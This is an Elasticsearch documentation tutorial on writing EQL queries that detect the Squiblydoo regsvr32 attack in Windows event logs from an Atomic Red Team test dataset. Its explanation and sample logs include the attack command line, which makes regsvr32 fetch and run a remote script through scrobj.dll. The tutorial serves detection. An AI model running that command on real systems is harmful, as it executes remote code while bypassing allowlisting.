{
    "meta": {
        "timestamp": "2024-11-01T02:49:24.932066",
        "size": 12198,
        "url": "https://www.elastic.co/guide/en/elasticsearch/reference/current/eql-ex-threat-detection.html",
        "type": "documentation",
        "role": [
            "xpack"
        ],
        "has_code": false,
        "title": "eql-ex-threat-detection",
        "version": "8.15"
    },
    "doc": "[role=\"xpack\"]\n[[eql-ex-threat-detection]]\n== Example: Detect threats with EQL\n\nThis example tutorial shows how you can use EQL to detect security threats and\nother suspicious behavior. In the scenario, you're tasked with detecting\nhttps://attack.mitre.org/techniques/T1218/010/[regsvr32 misuse] in Windows event\nlogs.\n\n`regsvr32.exe` is a built-in command-line utility used to register `.dll`\nlibraries in Windows. As a native tool, `regsvr32.exe` has a trusted status,\nletting it bypass most allowlist software and script blockers.\nAttackers with access to a user's command line can use `regsvr32.exe` to run\nmalicious scripts via `.dll` libraries, even on machines that otherwise\ndisallow such scripts.\n\nOne common variant of regsvr32 misuse is a\nhttps://attack.mitre.org/techniques/T1218/010/[Squiblydoo attack]. In a\nSquiblydoo attack, a `regsvr32.exe` command uses the `scrobj.dll` library to\nregister and run a remote script. These commands often look like this:\n\n[source,sh]\n----\n\"regsvr32.exe  /s /u /i:<script-url> scrobj.dll\"\n----\n\n[discrete]\n[[eql-ex-threat-detection-setup]]\n=== Setup\n\nThis tutorial uses a test dataset from\nhttps://github.com/redcanaryco/atomic-red-team[Atomic Red Team] that includes\nevents imitating a Squiblydoo attack. The data has been mapped to\n{ecs-ref}[Elastic Common Schema (ECS)] fields.\n\nTo get started:\n\n. Create an <<index-templates,index template>> with\n<<create-index-template,data stream enabled>>:\n+\n////\n[source,console]\n----\nDELETE /_data_stream/*\nDELETE /_index_template/*\n----\n// TEARDOWN\n////\n+\n[source,console]\n----\nPUT /_index_template/my-data-stream-template\n{\n  \"index_patterns\": [ \"my-data-stream*\" ],\n  \"data_stream\": { },\n  \"priority\": 500\n}\n----\n\n. Download https://raw.githubusercontent.com/elastic/elasticsearch/{branch}/docs/src/yamlRestTest/resources/normalized-T1117-AtomicRed-regsvr32.json[`normalized-T1117-AtomicRed-regsvr32.json`].\n\n. Use the <<docs-bulk,bulk API>> to index the data to a matching stream:\n+\n[source,sh]\n----\ncurl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-data-stream/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n----\n// NOTCONSOLE\n\n. Use the <<cat-indices,cat indices API>> to verify the data was indexed:\n+\n[source,console]\n----\nGET /_cat/indices/my-data-stream?v=true&h=health,status,index,docs.count\n----\n// TEST[setup:atomic_red_regsvr32]\n+\nThe response should show a `docs.count` of `150`.\n+\n[source,txt]\n----\nhealth status index                                 docs.count\nyellow open   .ds-my-data-stream-2099.12.07-000001         150\n----\n// TESTRESPONSE[s/.ds-my-data-stream-2099.12.07-000001/.+/ non_json]\n\n[discrete]\n[[eql-ex-get-a-count-of-regsvr32-events]]\n=== Get a count of regsvr32 events\n\nFirst, get a count of events associated with a `regsvr32.exe` process:\n\n[source,console]\n----\nGET /my-data-stream/_eql/search?filter_path=-hits.events    <1>\n{\n  \"query\": \"\"\"\n    any where process.name == \"regsvr32.exe\"                <2>\n  \"\"\",\n  \"size\": 200                                               <3>\n}\n----\n// TEST[setup:atomic_red_regsvr32]\n\n<1> `?filter_path=-hits.events` excludes the `hits.events` property from the\nresponse. This search is only intended to get an event count, not a list of\nmatching events.\n<2> Matches any event with a `process.name` of `regsvr32.exe`.\n<3> Returns up to 200 hits for matching events.\n\nThe response returns 143 related events.\n\n[source,console-result]\n----\n{\n  \"is_partial\": false,\n  \"is_running\": false,\n  \"took\": 60,\n  \"timed_out\": false,\n  \"hits\": {\n    \"total\": {\n      \"value\": 143,\n      \"relation\": \"eq\"\n    }\n  }\n}\n----\n// TESTRESPONSE[s/\"took\": 60/\"took\": $body.took/]\n\n[discrete]\n[[eql-ex-check-for-command-line-artifacts]]\n=== Check for command line artifacts\n\n`regsvr32.exe` processes were associated with 143 events. But how was\n`regsvr32.exe` first called? And who called it? `regsvr32.exe` is a command-line\nutility. Narrow your results to processes where the command line was used:\n\n[source,console]\n----\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    process where process.name == \"regsvr32.exe\" and process.command_line.keyword != null\n  \"\"\"\n}\n----\n// TEST[setup:atomic_red_regsvr32]\n\nThe query matches one event with an `event.type` of `creation`, indicating the\nstart of a `regsvr32.exe` process. Based on the event's `process.command_line`\nvalue, `regsvr32.exe` used `scrobj.dll` to register a script, `RegSvr32.sct`.\nThis fits the behavior of a Squiblydoo attack.\n\n[source,console-result]\n----\n{\n  ...\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"events\": [\n      {\n        \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n        \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n        \"_source\": {\n          \"process\": {\n            \"parent\": {\n              \"name\": \"cmd.exe\",\n              \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n              \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n            },\n            \"name\": \"regsvr32.exe\",\n            \"pid\": 2012,\n            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n            \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n            \"ppid\": 2652\n          },\n          \"logon_id\": 217055,\n          \"@timestamp\": 131883573237130000,\n          \"event\": {\n            \"category\": \"process\",\n            \"type\": \"creation\"\n          },\n          \"user\": {\n            \"full_name\": \"bob\",\n            \"domain\": \"ART-DESKTOP\",\n            \"id\": \"ART-DESKTOP\\\\bob\"\n          }\n        }\n      }\n    ]\n  }\n}\n----\n// TESTRESPONSE[s/  \\.\\.\\.\\n/\"is_partial\": false, \"is_running\": false, \"took\": $body.took, \"timed_out\": false,/]\n// TESTRESPONSE[s/\"_index\": \".ds-my-data-stream-2099.12.07-000001\"/\"_index\": $body.hits.events.0._index/]\n// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n\n[discrete]\n[[eql-ex-check-for-malicious-script-loads]]\n=== Check for malicious script loads\n\nCheck if `regsvr32.exe` later loads the `scrobj.dll` library:\n\n[source,console]\n----\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    library where process.name == \"regsvr32.exe\" and dll.name == \"scrobj.dll\"\n  \"\"\"\n}\n----\n// TEST[setup:atomic_red_regsvr32]\n\nThe query matches an event, confirming `scrobj.dll` was loaded.\n\n[source,console-result]\n----\n{\n  ...\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"events\": [\n      {\n        \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n        \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n        \"_source\": {\n          \"process\": {\n            \"name\": \"regsvr32.exe\",\n            \"pid\": 2012,\n            \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n            \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n          },\n          \"@timestamp\": 131883573237450016,\n          \"dll\": {\n            \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n            \"name\": \"scrobj.dll\"\n          },\n          \"event\": {\n            \"category\": \"library\"\n          }\n        }\n      }\n    ]\n  }\n}\n----\n// TESTRESPONSE[s/  \\.\\.\\.\\n/\"is_partial\": false, \"is_running\": false, \"took\": $body.took, \"timed_out\": false,/]\n// TESTRESPONSE[s/\"_index\": \".ds-my-data-stream-2099.12.07-000001\"/\"_index\": $body.hits.events.0._index/]\n// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.events.0._id/]\n\n[discrete]\n[[eql-ex-detemine-likelihood-of-success]]\n=== Determine the likelihood of success\n\nIn many cases, attackers use malicious scripts to connect to remote servers or\ndownload other files. Use an <<eql-sequences,EQL sequence query>> to check\nfor the following series of events:\n\n. A `regsvr32.exe` process\n. A load of the `scrobj.dll` library by the same process\n. Any network event by the same process\n\nBased on the command line value seen in the previous response, you can expect to\nfind a match. However, this query isn't designed for that specific command.\nInstead, it looks for a pattern of suspicious behavior that's generic enough to\ndetect similar threats.\n\n[source,console]\n----\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence by process.pid\n      [process where process.name == \"regsvr32.exe\"]\n      [library where dll.name == \"scrobj.dll\"]\n      [network where true]\n  \"\"\"\n}\n----\n// TEST[setup:atomic_red_regsvr32]\n\nThe query matches a sequence, indicating the attack likely succeeded.\n\n[source,console-result]\n----\n{\n  ...\n  \"hits\": {\n    \"total\": {\n      \"value\": 1,\n      \"relation\": \"eq\"\n    },\n    \"sequences\": [\n      {\n        \"join_keys\": [\n          2012\n        ],\n        \"events\": [\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"gl5MJXMBMk1dGnErnBW8\",\n            \"_source\": {\n              \"process\": {\n                \"parent\": {\n                  \"name\": \"cmd.exe\",\n                  \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010AA385401}\",\n                  \"executable\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\"\n                },\n                \"name\": \"regsvr32.exe\",\n                \"pid\": 2012,\n                \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n                \"command_line\": \"regsvr32.exe  /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct scrobj.dll\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\n                \"ppid\": 2652\n              },\n              \"logon_id\": 217055,\n              \"@timestamp\": 131883573237130000,\n              \"event\": {\n                \"category\": \"process\",\n                \"type\": \"creation\"\n              },\n              \"user\": {\n                \"full_name\": \"bob\",\n                \"domain\": \"ART-DESKTOP\",\n                \"id\": \"ART-DESKTOP\\\\bob\"\n              }\n            }\n          },\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"ol5MJXMBMk1dGnErnBW8\",\n            \"_source\": {\n              \"process\": {\n                \"name\": \"regsvr32.exe\",\n                \"pid\": 2012,\n                \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              },\n              \"@timestamp\": 131883573237450016,\n              \"dll\": {\n                \"path\": \"C:\\\\Windows\\\\System32\\\\scrobj.dll\",\n                \"name\": \"scrobj.dll\"\n              },\n              \"event\": {\n                \"category\": \"library\"\n              }\n            }\n          },\n          {\n            \"_index\": \".ds-my-data-stream-2099.12.07-000001\",\n            \"_id\": \"EF5MJXMBMk1dGnErnBa9\",\n            \"_source\": {\n              \"process\": {\n                \"name\": \"regsvr32.exe\",\n                \"pid\": 2012,\n                \"entity_id\": \"{42FC7E13-CBCB-5C05-0000-0010A0395401}\",\n                \"executable\": \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\"\n              },\n              \"@timestamp\": 131883573238680000,\n              \"destination\": {\n                \"address\": \"151.101.48.133\",\n                \"port\": \"443\"\n              },\n              \"source\": {\n                \"address\": \"192.168.162.134\",\n                \"port\": \"50505\"\n              },\n              \"event\": {\n                \"category\": \"network\"\n              },\n              \"user\": {\n                \"full_name\": \"bob\",\n                \"domain\": \"ART-DESKTOP\",\n                \"id\": \"ART-DESKTOP\\\\bob\"\n              },\n              \"network\": {\n                \"protocol\": \"tcp\",\n                \"direction\": \"outbound\"\n              }\n            }\n          }\n        ]\n      }\n    ]\n  }\n}\n----\n// TESTRESPONSE[s/  \\.\\.\\.\\n/\"is_partial\": false, \"is_running\": false, \"took\": $body.took, \"timed_out\": false,/]\n// TESTRESPONSE[s/\"_index\": \".ds-my-data-stream-2099.12.07-000001\"/\"_index\": $body.hits.sequences.0.events.0._index/]\n// TESTRESPONSE[s/\"_id\": \"gl5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.sequences.0.events.0._id/]\n// TESTRESPONSE[s/\"_id\": \"ol5MJXMBMk1dGnErnBW8\"/\"_id\": $body.hits.sequences.0.events.1._id/]\n// TESTRESPONSE[s/\"_id\": \"EF5MJXMBMk1dGnErnBa9\"/\"_id\": $body.hits.sequences.0.events.2._id/]\n"
}